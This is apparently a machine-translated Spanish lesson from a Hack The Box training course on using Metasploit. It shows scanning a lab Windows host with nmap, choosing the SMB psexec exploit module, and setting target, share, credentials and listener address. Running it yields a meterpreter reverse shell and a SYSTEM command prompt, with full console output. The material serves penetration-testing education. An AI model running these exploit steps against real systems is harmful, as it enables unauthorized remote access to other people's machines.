# Automatizar cargas útiles y entrega con metasploit

[Metasploit](https://www.metasploit.com/)es un marco de ataque automatizado desarrollado por`Rapid7`Eso agiliza el proceso de explotar vulnerabilidades mediante el uso de módulos preconstruidos que contienen opciones fáciles de usar para explotar vulnerabilidades y entregar cargas útiles para obtener un shell en un sistema vulnerable. Puede hacer que explotar un sistema vulnerable sea tan fácil que algunos proveedores de capacitación en ciberseguridad limitan cuántas veces se puede usar en los exámenes de laboratorio. Aquí en Hack the Box, alentamos a experimentar con herramientas en nuestros entornos de laboratorio hasta que tenga una sólida comprensión fundamental. La mayoría de las organizaciones no nos limitarán en qué herramientas podemos o no podemos usar en un compromiso. Sin embargo, esperarán que sepamos lo que estamos haciendo. Por lo tanto, es nuestra responsabilidad buscar una comprensión a medida que aprendemos. No entender los efectos de las herramientas que usamos puede ser destructivo en una prueba o auditoría de penetración en vivo. Esta es una razón principal por la que debemos buscar constantemente una comprensión más profunda de las herramientas, técnicas, metodologías y prácticas que aprendemos.

En esta sección, interactuaremos con el`community edition`de Metasploit en Pwnbox. Usaremos pre-construido`modules`y elaborar cargas útiles con`MSFVenom`. Es importante tener en cuenta que muchas empresas de ciberseguridad establecidas utilizan la edición pagada de MetaSploit llamada`Metasploit Pro`Realizar pruebas de penetración, auditorías de seguridad e incluso campañas de ingeniería social. Si desea explorar las diferencias entre la edición comunitaria y el metasploit pro, puede consultar esto[tabla de comparación](https://www.rapid7.com/products/metasploit/download/editions/).

---

# **Practicando con metasploit**

Podríamos gastar el resto de este módulo cubriendo todo lo relacionado con MetaSploit, pero solo vamos a ir tan lejos como para trabajar con los mismos conceptos básicos dentro del contexto de conchas y cargas útiles.

Comencemos a trabajar a mano con Metasploit iniciando la consola del marco de Metasploit como root (`sudo msfconsole`)

### **Iniciado MSF**

Automatizar cargas útiles y entrega con metasploit

```
xnoxos@htb[/htb]$ sudo msfconsole
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your
module, why not try the reload command

msf6 >

```

Podemos ver que hay un arte ASCII creativo presentado como el banner en el lanzamiento y algunos números de particular interés.

- `2131`exploits
- `592`cargas útiles

Estos números pueden cambiar a medida que los mantenedores agregan y eliminan el código o si importa un módulo para usar en MetaSploit. Familiarémonos con las cargas útiles de MetaSploit utilizando un clásico`exploit module`Eso se puede utilizar para comprometer un sistema de Windows. Recuerde que MetaSploit se puede usar para algo más que explotación. También podemos usar diferentes módulos para escanear y enumerar objetivos.

En este caso, utilizaremos resultados de enumeración de un`nmap`Escanee para elegir un módulo de metasploit para usar.

### **Escaneo nmap**

Automatizar cargas útiles y entrega con metasploit

```
xnoxos@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-09T21:03:31
|_  start_date: N/A

```

En la salida, vemos varios puertos estándar que generalmente están abiertos en un sistema de Windows de forma predeterminada. Recuerde que el escaneo y la enumeración es una excelente manera de saber qué sistema operativo (Windows o Linux) nuestro objetivo está ejecutando para encontrar un módulo apropiado para ejecutar con MetaSploit. Vamos con`SMB`(escuchando`445`) como el vector de ataque potencial.

Una vez que tenemos esta información, podemos usar la funcionalidad de búsqueda de Metasploit para descubrir módulos asociados con SMB. En el`msfconsole`, podemos emitir el comando`search smb`Para obtener una lista de módulos asociados con las vulnerabilidades de SMB:

### **Buscando dentro de Metasploit**

Automatizar cargas útiles y entrega con metasploit

```
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description  -       ----                                                     ---------------    ----   -----  ----------
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution

```

Veremos una larga lista de`Matching Modules`asociado con nuestra búsqueda. Observe el formato que se encuentra cada módulo. Cada módulo tiene un número en el extremo izquierdo de la tabla para facilitar la selección del módulo, un`Name`, `Disclosure Date`, `Rank`, `Check`y`Description`.

El número del `izquierdista 'de cada módulo potencial es un número relativo basado en su búsqueda que puede cambiar a medida que los módulos se agregan a MetaSploit. No espere que este número coincida cada vez que realice la búsqueda o intente usar el módulo.

Veamos un módulo, en particular, para comprenderlo dentro del contexto de las cargas útiles.

`56 exploit/windows/smb/psexec`

| **Producción** | **Significado** |
| --- | --- |
| `56` | El número asignado al módulo en la tabla dentro del contexto de la búsqueda. Este número hace que sea más fácil de seleccionar. Podemos usar el comando`use 56`Para seleccionar el módulo. |
| `exploit/` | Esto define el tipo de módulo. En este caso, este es un módulo de exploit. Muchos módulos de explotación en MSF incluyen la carga útil que intenta establecer una sesión de shell. |
| `windows/` | Esto define la plataforma a la que estamos apuntando. En este caso, sabemos que el objetivo es Windows, por lo que la exploit y la carga útil serán para Windows. |
| `smb/` | Esto define el servicio para el cual se escribe la carga útil en el módulo. |
| `psexec` | Esto define la herramienta que se cargará en el sistema de destino si es vulnerable. |

Una vez que seleccionemos el módulo, notaremos un cambio en el mensaje que nos brinda la capacidad de configurar el módulo basado en parámetros específicos de nuestro entorno.

### **Selección de opciones**

Automatizar cargas útiles y entrega con metasploit

```
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >

```

Notar cómo`exploit`está fuera de los paréntesis. Esto puede interpretarse como el tipo de módulo MSF como un exploit, y la explotación específica y la carga útil se escriben para Windows. El vector de ataque es`SMB`, y la carga útil del meterpreter se entregará utilizando[psexeco](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Aprendamos más sobre el uso de esta exploit y entregando la carga útil utilizando el`options`dominio.

### **Examinar las opciones de un exploit**

Automatizar cargas útiles y entrega con metasploit

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Esta es un área donde el metasploit brilla en términos de facilidad de uso. En la salida de las opciones del módulo, vemos varias opciones y configuraciones con una descripción de lo que significa cada configuración. No estaremos usando`SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME`y`SERVICE_NAME`en esta sección. Observe cómo este exploit en particular utilizará una conexión de shell TCP inversa utilizando`Meterpreter`. Un caparazón de meterpreter nos brinda mucha más funcionalidad que una carcasa inversa TCP sin procesar, como establecimos en las secciones anteriores de este módulo. Es la carga útil predeterminada que se usa en MetaSploit.

Queremos usar el`set`comandar para configurar la siguiente configuración como tal:

### **Configuración de opciones**

Automatizar cargas útiles y entrega con metasploit

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222

```

Estas configuraciones asegurarán que nuestra carga útil se entregue al objetivo adecuado (`RHOSTS`), cargado a la participación administrativa predeterminada (`ADMIN$`) utilizando credenciales (`SMBPass` & `SMBUser`), luego inicie una conexión de shell inversa con nuestra máquina host local (`LHOST`).

Estas configuraciones serán específicas de la dirección IP en su cuadro de ataque y en el cuadro de destino. Así como con las credenciales que puede reunir en un compromiso. Podemos establecer la dirección IP del túnel VPN LHOST (host local) o la ID de interfaz del túnel VPN.

### **Exploies**

Automatizar cargas útiles y entrega con metasploit

```
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter >

```

Después de emitir el`exploit`Comando, el exploit se ejecuta y hay un intento de entregar la carga útil al objetivo utilizando la carga útil de Meterpreter. MetaSploit informa cada paso de este proceso, como se ve en la salida. Sabemos que esto fue exitoso porque un`stage`se envió con éxito, que estableció una sesión de shell de meterpreter (`meterpreter >`) y una sesión de shell a nivel de sistema. Tenga en cuenta que Meterpreter es una carga útil que utiliza la inyección de DLL en memoria para establecer sigilosamente un canal de comunicación entre un cuadro de ataque y un objetivo. Las credenciales y el vector de ataque adecuados pueden darnos la capacidad de cargar y descargar archivos, ejecutar comandos del sistema, ejecutar un keylogger, crear/iniciar/detener los servicios, administrar procesos y más.

En este caso, como se detalla en el[Documentación de módulo Rapid 7](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): "Este módulo utiliza un nombre de usuario y contraseña de administrador válidos (o hash de contraseña) para ejecutar una carga útil arbitraria. Este módulo es similar a la utilidad" psexec "proporcionada por Sysinternals. Este módulo ahora puede limpiar después de sí mismo. El servicio creado por esta herramienta usa un nombre y descripción elegidos al azar".

Al igual que otros intérpretes de lenguaje de comandos (Bash, PowerShell, KSH, etc.), las sesiones de shell de meterpreter nos permiten emitir un conjunto de comandos que podemos usar para interactuar con el sistema de destino. Podemos usar el`?`Para ver una lista de comandos que podemos usar. Notaremos limitaciones con el shell meterpreter, por lo que es bueno intentar usar el`shell`Comandar para caer en un shell a nivel de sistema si necesitamos trabajar con el conjunto completo de comandos del sistema nativos de nuestro objetivo.

### **Caparazón interactivo**

Automatizar cargas útiles y entrega con metasploit

```
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>

```

`Now let's put our knowledge to the test with some challenge questions`.